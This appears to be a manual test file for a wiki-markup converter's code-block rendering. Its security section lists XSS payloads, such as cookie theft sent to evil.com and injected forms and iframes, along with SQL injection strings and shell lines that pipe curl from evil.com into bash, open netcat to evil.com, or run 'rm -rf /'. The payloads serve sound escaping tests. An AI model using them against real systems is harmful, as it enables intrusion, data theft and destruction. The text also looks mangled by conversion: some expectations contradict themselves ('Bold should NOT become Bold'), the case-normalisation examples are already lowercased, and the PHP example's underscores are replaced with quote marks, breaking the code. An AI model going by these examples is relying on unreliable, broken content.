= Code Blocks Testing - Phase 5a & 5b ✅ =

'''Purpose:''' Manual testing file for code block rendering. Copy/paste this entire file into Column 2 (WikiFormatting) to verify Column 3 rendering works correctly.

'''Phase 5b - Column 3 (Rendered Preview):'''
- Code blocks render as styled `<pre><code>` elements
- Language classes applied: `language-javascript`, etc.
- All HTML properly escaped (no script execution)
- GitHub-style code block styling with dark mode
- Inline code renders as `<code>` elements
- XSS prevention verified (malicious code shows as text)

---

== Basic Code Blocks ==

=== Generic (no language) ===

{{{
function example() {
  return true;
}
}}}

Expected: `{{{\nfunction example()...\n}}}`

=== JavaScript (lowercase) ===

{{{#!javascript
const greeting = "Hello World";
console.log(greeting);
}}}

Expected: `{{{#!javascript`

=== JavaScript (UPPERCASE) ===

{{{#!javascript
const uppercase = "test";
}}}

Expected: `{{{#!javascript` (normalized to lowercase)

=== JavaScript (MixedCase) ===

{{{#!javascript
const mixed = "case";
}}}

Expected: `{{{#!javascript` (normalized to lowercase)

---

== Language Shorthands ==

=== js → javascript ===

{{{#!javascript
const arr = [1, 2, 3];
}}}

=== ts → javascript ===

{{{#!javascript
interface User {
  name: string;
}
}}}

=== sh → bash ===

{{{#!bash
echo "Hello"
}}}

=== md → markdown ===

{{{#!markdown
= Heading =
}}}

---

== WordPress Languages ==

=== PHP ===

{{{#!php
<?php
function wp_example() {
    return get_option('example');
}
?>
}}}

=== HTML ===

{{{#!html
<div class="container">
  <h1>Title</h1>
</div>
}}}

=== CSS ===

{{{#!css
.button {
  background: #0073aa;
  padding: 10px 20px;
}
}}}

---

== Content Protection Test ==

'''CRITICAL:''' This code block contains Markdown syntax that should NOT be converted:

{{{
= This heading should stay as =
== This too should stay as ==

'''Bold''' should NOT become '''Bold'''
''Italic'' should NOT become ''Italic''

[https://example.com Link text] should NOT become [https://example.com Link text]

[[WikiPage]] should stay as [[WikiPage]]
}}}

'''Expected in Column 2:''' All Markdown preserved literally inside `{{{` / `}}}`

---

== Nested Code Blocks ==

=== Documentation: Showing how to write code blocks ===

{{{#!markdown
To create a JavaScript code block in Markdown:

```javascript
console.log("hello");
```

That's it!
}}}

'''Expected:''' Inner ` ```javascript ` preserved as literal text

=== Deep Nesting (5 backticks) ===

{{{
Outer fence (5 backticks) contains:

````
Middle fence (4 backticks) contains:

```
Inner content
```
````
}}}

---

== Multiple Blocks ==

First block:
{{{#!javascript
const first = 1;
}}}

Some text between blocks.

Second block:
{{{#!php
<?php echo "second"; ?>
}}}

More text.

Third block:
{{{
generic
}}}

---

== Edge Cases ==

=== Empty Block ===

{{{
}}}

'''Expected:''' `{{{\n}}}`

=== Single Line ===

{{{#!javascript
const x = 42;
}}}

=== Special Characters ===

{{{#!javascript
const str = "Special: <>&\"'";
const regex = /test/g;
}}}

=== WikiFormatting Delimiters Inside Code ===

{{{
Showing WikiFormatting syntax:

{{{
  code block
}}}

{{{#!python
  code with language
}}}
}}}

'''Expected:''' The `{{{` and `}}}` inside preserved literally

---

== Security Test Cases ==

'''CRITICAL SECURITY VERIFICATION:''' These examples contain malicious code that MUST render as safe text, never execute.

=== XSS: Script Injection ===

{{{#!javascript
<script>alert('XSS')</script>
<script>document.location='http://evil.com/?cookie='+document.cookie</script>
<script src="http://evil.com/malicious.js"></script>
}}}

'''Expected in Column 3:''' Script tags appear as visible text `&lt;script&gt;`, never executed

=== XSS: Image Tag with Error Handler ===

{{{#!html
<img src=x onerror="alert('XSS')">
<img src="invalid" onerror="window.location='http://evil.com'">
<img src="javascript:alert('XSS')">
}}}

'''Expected:''' HTML escaped, no images rendered, no JavaScript executed

=== XSS: Iframe Injection ===

{{{#!html
<iframe src="javascript:alert('XSS')"></iframe>
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
<iframe src="http://evil.com/phishing"></iframe>
}}}

'''Expected:''' Iframe tags visible as text, nothing embedded

=== XSS: Event Handlers ===

{{{#!html
<div onclick="alert('XSS')">Click me</div>
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<select onfocus="alert('XSS')" autofocus>
<textarea onfocus="alert('XSS')" autofocus>
<button onmouseover="alert('XSS')">Hover me</button>
}}}

'''Expected:''' All event handlers rendered as plain text, no execution

=== XSS: SVG Injection ===

{{{#!html
<svg><script>alert('XSS')</script></svg>
<svg onload="alert('XSS')"></svg>
<svg><animate onbegin="alert('XSS')"></svg>
}}}

'''Expected:''' SVG tags escaped and visible, no graphics rendered

=== XSS: Object/Embed Tags ===

{{{#!html
<object data="javascript:alert('XSS')"></object>
<object data="data:text/html,<script>alert('XSS')</script>"></object>
<embed src="javascript:alert('XSS')">
<embed src="data:text/html,<script>alert('XSS')</script>">
}}}

'''Expected:''' Tags escaped, no embedded content

=== XSS: Form Injection ===

{{{#!html
<form action="http://evil.com/steal">
  <input name="password" type="password">
  <input type="submit">
</form>
}}}

'''Expected:''' Form tags visible as text, no interactive form

=== XSS: Meta Tag Redirect ===

{{{#!html
<meta http-equiv="refresh" content="0;url=http://evil.com">
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
}}}

'''Expected:''' Meta tags escaped, no redirects

=== XSS: Link Tag Injection ===

{{{#!html
<link rel="stylesheet" href="javascript:alert('XSS')">
<link rel="import" href="http://evil.com/malicious.html">
}}}

'''Expected:''' Link tags visible as text, no stylesheets loaded

=== XSS: Data URIs ===

{{{#!html
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>
}}}

'''Expected:''' Links escaped, no data URI execution

=== SQL Injection (showing code protection) ===

{{{#!sql
'; DROP TABLE users; --
' OR '1'='1
admin'--
' UNION SELECT password FROM users--
}}}

'''Expected:''' SQL preserved as literal text in code block

=== Command Injection ===

{{{#!bash
; rm -rf /
$(curl http://evil.com/malware.sh | bash)
`wget http://evil.com/backdoor`
| nc evil.com 1234
}}}

'''Expected:''' Bash commands preserved as literal text

=== JavaScript Protocol URIs ===

{{{#!javascript
javascript:alert('XSS')
javascript:void(document.cookie)
vbscript:msgbox("XSS")
}}}

'''Expected:''' URIs rendered as text, not clickable or executable

=== Real-World Attack Vectors ===

{{{#!html
<!-- Polyglot XSS -->
jaVasCript:/''-/''`/''\`/'''/''"/''''/(/'' */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e

<!-- Encoded XSS -->
&#60;script&#62;alert('XSS')&#60;/script&#62;
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Unicode XSS -->
<script>alert('XSS')</script>
}}}

'''Expected:''' All encoded/obfuscated attacks rendered safely as text

---

== Security Verification Checklist ==

'''After pasting this file into Column 1, verify in Column 3 (Rendered View):'''

- [ ] '''NO JavaScript executes''' (no alert boxes, no console errors)
- [ ] '''NO images load''' (including broken image icons)
- [ ] '''NO iframes/embeds appear'''
- [ ] '''NO forms are interactive'''
- [ ] '''NO redirects occur'''
- [ ] '''NO external resources load''' (check Network tab in DevTools)
- [ ] All HTML tags show as escaped text: `&lt;script&gt;`, `&lt;img&gt;`, etc.
- [ ] All event handlers visible as text: `onclick="..."`, `onload="..."`, etc.
- [ ] All malicious URIs show as text: `javascript:`, `data:`, `vbscript:`
- [ ] Code blocks maintain `{{{` / `}}}` delimiters in Column 2
- [ ] React rendering is safe (inspect element shows escaped content)

'''How to verify:'''
1. Open Browser DevTools (F12)
2. Go to Console tab - should be NO errors or alerts
3. Go to Network tab - should be NO external requests
4. Visually inspect Column 3 - should see only text, no rendered HTML/scripts
5. Inspect element - HTML should show `&lt;` and `&gt;` entities

---

== Real-World WordPress Example ==

{{{#!php
<?php
/**
 * Register custom post type for Books
 *
 * @since 1.0.0
 */
function register''book''post_type() {
    $labels = array(
        'name'               => __( 'Books', 'textdomain' ),
        'singular''name'      => _''( 'Book', 'textdomain' ),
        'add''new'            => _''( 'Add New Book', 'textdomain' ),
        'edit''item'          => _''( 'Edit Book', 'textdomain' ),
    );

    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'has_archive'        => true,
        'menu_icon'          => 'dashicons-book',
        'supports'           => array( 'title', 'editor', 'thumbnail' ),
    );

    register''post''type( 'book', $args );
}
add''action( 'init', 'register''book''post''type' );
?>
}}}

---

== Verification Checklist ==

'''In Column 2 (WikiFormatting), verify:'''

- [ ] All code blocks wrapped in `{{{` and `}}}`
- [ ] Language blocks show `{{{#!` prefix
- [ ] Languages normalized to lowercase (`JAVASCRIPT` → `javascript`)
- [ ] Shorthands converted: `js`→`javascript`, `ts`→`javascript`, `sh`→`bash`, `md`→`markdown`
- [ ] Nested blocks: inner ` ``` ` NOT converted, preserved as literal text
- [ ] Content protection: `#`, `''*`, `''`, `[text](url)` inside code stay literal
- [ ] Empty blocks: `{{{\n}}}`
- [ ] Multiple blocks: each converted independently
- [ ] Special chars preserved: `<>&"'`

'''Column 3:''' Will show raw WikiFormatting text (rendering not implemented in Phase 5a)